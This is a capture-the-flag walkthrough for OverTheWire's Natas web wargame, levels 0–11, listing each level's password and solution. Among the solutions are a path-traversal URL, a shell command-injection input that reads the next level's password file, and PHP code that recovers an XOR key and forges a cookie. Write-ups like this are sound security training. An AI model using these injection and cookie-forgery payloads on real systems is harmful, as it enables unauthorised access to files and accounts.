# Natas wargame writeups

Home page: https://overthewire.org/wargames/natas/

## Connect the game

```
http://natas<level>.natas.labs.overthewire.org
```
with `<level>` is your level's room

+ no SSH login
+ all passwords are also stored in `/etc/natas_webpass/natas<level>`

## Notes for game

+ view source, devtools
+ Burpsuite skills
+ php sandbox https://onlinephp.io/

## Walkthrough

| Username | Password |
| :--- | :--- |
| natas0 | natas0 |

```
Ctrl+U to view source
```

| Username | Password |
| :--- | :--- |
| natas1 | g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 |

```
Ctrl+U to view source
```

| Username | Password |
| :--- | :--- |
| natas2 | h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 |

```
Ctrl+U to view source
see an image, but a file folder
http://natas2.natas.labs.overthewire.org/files/users.txt
```

| Username | Password |
| :--- | :--- |
| natas3 | G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q |

```
Ctrl+U to view source
check /robots.txt because google will find it
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

| Username | Password |
| :--- | :--- |
| natas4 | tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm |

```
use BurpSuite catch requests
click Refresh
change Referer: http://natas5.natas.labs.overthewire.org/
```

| Username | Password |
| :--- | :--- |
| natas5 | Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD |

```
use BurpSuite catch requests
change Cookie: loggedin=1
```

| Username | Password |
| :--- | :--- |
| natas6 | fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR |

```
check sourcecode php
http://natas6.natas.labs.overthewire.org/includes/secret.inc
input secret: FOEIUWGHFEEUHOFUOIU
```

| Username | Password |
| :--- | :--- |
| natas7 | jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr |

```
Ctrl+U to view source
path traversal ?page=home
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

| Username | Password |
| :--- | :--- |
| natas8 | a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB |

```
check sourcecode php
reverse the code to get secret
<?php
echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
?>
input secret: oubWYf2kBq
```

| Username | Password |
| :--- | :--- |
| natas9 | Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd |

```
check sourcecode php
command injection
find words containing: ; cat /etc/natas_webpass/natas10;
```

| Username | Password |
| :--- | :--- |
| natas10 | D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE |

```
check sourcecode php
use grep character in many files
find words containing: 11* /etc/natas_webpass/natas11
```

| Username | Password |
| :--- | :--- |
| natas11 | 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg |

```
check sourcecode php
check cookie data
reverse the code to get $key
<?php
$originalString = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
$cookieString = base64_decode('MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLX54bjY=');
echo $originalString ^ $cookieString;
?>
rebuild cookie with our payload
<?php
$key = 'KNHL';
$newString = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$cookieData = '';
for ($i = 0; $i < strlen($newString); $i++) {
  $cookieData .= $key[$i % strlen($key)] ^ $newString[$i];
}
echo base64_encode($cookieData);
?>
change cookie data to MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
```

| Username | Password |
| :--- | :--- |
| natas12 | YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG |




































